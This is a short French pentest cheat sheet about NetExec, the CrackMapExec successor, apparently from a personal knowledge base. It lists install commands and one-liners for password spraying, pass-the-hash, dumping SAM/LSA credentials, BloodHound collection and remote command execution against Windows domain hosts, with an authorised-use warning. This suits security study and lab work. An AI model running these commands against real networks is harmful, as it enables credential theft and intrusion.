---
titre: "NetExec (nxc)"
tags: [Outils, AD, windows, SMB, LDAP, spraying]
source: https://github.com/Pennyw0rth/NetExec
---

# NetExec (nxc)

**Successeur de CrackMapExec.** Outil d'exécution réseau qui automatise
l'énumération et les attaques sur un parc Windows/AD à grande échelle (SMB, LDAP,
WinRM, MSSQL, RDP, SSH, FTP, WMI…). La commande est `nxc` (ex-`cme`).

> ⚠️ Uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
pipx install git+https://github.com/Pennyw0rth/NetExec   # version la plus à jour
# ou : pipx install netexec   |   sudo apt install netexec (Kali)
```

## Utilisation
```bash
# forme générale : nxc PROTO CIBLE -u USER -p PASS
nxc smb 10.10.10.0/24 -u user -p 'Pass123'                 # validité + hosts
nxc smb 10.10.10.10 -u user -p 'Pass123' --shares          # partages
nxc smb 10.10.10.10 -u users.txt -p pass.txt               # password spraying
nxc smb 10.10.10.10 -u user -H <NTLM>                       # pass-the-hash
nxc smb 10.10.10.10 -u user -p pass --sam --lsa            # dump creds
nxc ldap 10.10.10.10 -u user -p pass --bloodhound -c All   # collecte BloodHound
nxc winrm 10.10.10.10 -u user -p pass -x "whoami"          # exécution
```

## Réflexe
Idéal pour **spraying** et **validation de creds** sur tout un subnet.
`--continue-on-success` pour balayer. Alimente [[BloodHound]] ; exploite les
creds trouvés avec [[Impacket]].
